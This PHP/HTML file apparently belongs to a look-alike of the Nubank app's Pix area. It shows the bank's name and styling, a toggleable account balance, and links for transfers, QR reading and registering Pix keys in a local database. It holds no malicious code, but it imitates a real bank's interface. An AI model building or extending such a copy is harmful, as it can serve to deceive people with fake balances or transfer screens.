<?php
include 'transferencias.php';
?>
<!DOCTYPE html>
<html><head>

  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" href="imagens/icone.png" />
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <script>
  window.onload = function() {
    var valElement = document.getElementById("val");
    var a1Image = document.getElementById("a1Image");

    a1Image.addEventListener("click", function() {
      if (valElement.innerHTML === "<?php echo $saldo; ?>") {
        valElement.innerHTML = "••••";
        valElement.style.fontSize = "25px";
        valElement.style.letterSpacing = "2px"; // Adiciona espaçamento de 2 pixels entre os caracteres
      } else {
        valElement.innerHTML = "<?php echo $saldo; ?>";
        valElement.style.fontSize = "17px";
        valElement.style.letterSpacing = "normal"; // Remove o espaçamento entre os caracteres
      }
    });
  };
</script>
<script>

function changeImage(img) {
  var imagePath = img.src;
  var imageName = imagePath.substring(imagePath.lastIndexOf('/') + 1, imagePath.length);

  if (imageName === 'a1.png') {
    img.src = 'imagens/a0.png'; // Altere o caminho da imagem clicada
  } else {
    img.src = 'imagens/a1.png'; // Altere o caminho da imagem normal
  }
}
</script>
<title>Nubank</title>
  <style type="text/css">
    body {
	text-align: center;
	margin: 0;
	padding: 0;
	background-color: #FFF;
    }
.texto1 {
	font-size: 16px;
	color: #666;
	font-family: Arial, Helvetica, sans-serif;
	font-weight: normal;
    line-height: 1;
}

    img {
      max-width: 100%;
      height: auto;
    }
.botaoentrar {
	background-color: #8A02DB;
	cursor: pointer;
	text-align: center;
	margin: 0px;
	padding: 0px;
	font-family: Tahoma, Geneva, sans-serif;
	width: 340px;
	font-size: 18px;
	background-position: center center;
	font-style: normal;
	height: 60px;
	border-radius: 50px;
	text-align: center;
	border: 1px none #FFF;
	color: #FFF;
}
  .fundoimagem tr td table tr td {
	font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
	background-image: url(03.png);
}
  .txt {
	font-family: Georgia, "Times New Roman", Times, serif;
	font-size: 14px;
}
  .fundo {
	background-image: url(imagens/inicial.PNG);
	background-repeat: no-repeat;
	background-position: center top;
	background-size: 100%;
	
}
  .topo {
}
  .topotexto {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 20px;
	color: #FFF;
}
  .bases {
}
.image-container {
  overflow-x: auto;
  white-space: nowrap;
}

.image-container img {
  display: inline-block;
  margin-right: 10px; /* Adicione um espaçamento entre as imagens */
}
  .fatura {
	font-size: 14px;
	font-family: Arial, Helvetica, sans-serif;
	color: #666;
}
  .limite {
	font-size: 13px;
	font-family: Arial, Helvetica, sans-serif;
	color: #797979;
}
  .linha {
	width: 100%;
	height: 1px;
	background-color: #EBEBEB;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
}
#divFixa {
	position: fixed;
	bottom: 2px; /* Ajuste o valor do espaçamento conforme necessário */
	width: 285px;
	left: 50%;
	transform: translateX(-50%);
	background-color: rgba(0, 0, 0, 0.0);
	opacity: 0.96;}
	.mensagem-transferencia {
    font-size: 12px;
    display: none;
    position: fixed;
    top: 0;
    left: 50%;
    transform: translateX(-50%);
    z-index: 9999;
    text-align: center; /* Centraliza o conteúdo interno */
    /* Opcional: Defina uma largura específica se necessário */
    width: 350px; */
}
.rounded-table {
font-size: 12px;
border-collapse: collapse;
border-radius: 15px;
overflow: hidden;
background-color: rgba(255, 255, 255, 0.95);
width: 100%;
}

.rounded-table td {
padding: 10px;
}


  </style>
</head>
<body>
<table width="350" border="0" align="center">
  <tr>
    <td height="50" align="center"><table width="350" border="0">
      <tr>
        <td><a href="painel2.php"><img src="imagens/x.png" alt="" width="24"></a></td>
        <td align="right"><img src="imagens/help.png" width="24"></td>
      </tr>
    </table></td>
  </tr>
</table>
<table width="100%" border="0">
  <tr>
    
  </tr>
</table>
<table width="350" border="0" align="center">
  <tr>
    <td><table width="350" border="0" align="center">
      <tr>
        <td height="50" align="left"><span style="font-size: 25px; font-family: Arial, Helvetica, sans-serif; font-weight: bold; color: #333;">Área Pix</span></td>
      </tr>
      <tr>
        <td height="40" align="left" valign="middle"><span class="fatura">Envie e receba pagamentos a qualquer hora e dia da semana, sem pagar nada por isso.</span></td>
      </tr>
    </table></td>
  </tr>
</table>
<table width="350" border="0" align="center">
  <tr>
    <td width="320" height="40" align="left"><span style="font-size: 22px; font-family: Arial, Helvetica, sans-serif; font-weight: bold; color: #333;">Enviar</span></td>
  </tr>
  <tr valign="middle">
    <td width="320" height="150" align="center"><table width="100%" border="0">
      <tr>
        <td align="left"><span class="image-container"><a href="transferir.php"><img src="imagens/transferir.png" width="75" height="240"></a></span></td>
        <td align="center"><span class="image-container"><img src="imagens/programar.png" width="75" height="240"></span></td>
        <td align="center"><span class="image-container"><img src="imagens/pixcopiacola.png" alt="" width="75" height="240"></span></td>
        <td align="right"><span class="image-container"><a href="lerqrcode.php"><img src="imagens/lerqrcode.png" alt="" width="75" height="240"></a></span></td>
      </tr>
    </table></td>
  </tr>
</table>
<table width="350" border="0" align="center">
  <tr>
    <td><table width="350" border="0" align="center">
      <tr>
        <td height="40" align="left"><span style="font-size: 16px; font-family: Arial, Helvetica, sans-serif; font-weight: bold; color: #333;">Registrar ou trazer chaves</span></td>
        <td align="center">&nbsp;</td>
      </tr>
      <tr>
        <td height="40" align="left" valign="middle"><span class="fatura">Registre uma nova chave ou faça uma portabilidade para o Nubank.</span></td>
        <td align="center" valign="top"><img src="imagens/setax.png" width="24"></td>
        </tr>
    </table></td>
  </tr>
</table>
<hr noshade="noshade" class="linha">
<table width="350" border="0" align="center">
  <tr>
    <td><table width="350" border="0" align="center">
      <tr>
        <td width="94%" height="40" align="left"><a href="cadastrochavepix.php" style="text-decoration: none;">
  <span style="font-size: 16px; font-family: Arial, Helvetica, sans-serif; font-weight: bold; color: #333;">Registrar Chave Pix ao Nubank</span>
</a>

</td>
        <td align="center">&nbsp;</td>
      </tr>
      <tr>
        <td height="40" align="left" valign="middle"><span class="fatura" style="text-decoration: none;">
  <a href="cadastrochavepix.php" style="text-decoration: none;color: #333;">Adicione chaves Pix ao banco de dados e encontre facilmente quando for efetuar uma transferência.</a>
</span>
</td>
        <td align="center" valign="top"><a href="cadastrochavepix.php"><img src="imagens/setax.png" width="24"></a></td>
        </tr>
    </table></td>
  </tr>
</table>
<hr noshade="noshade" class="linha"><br><br>
</body>
</html>
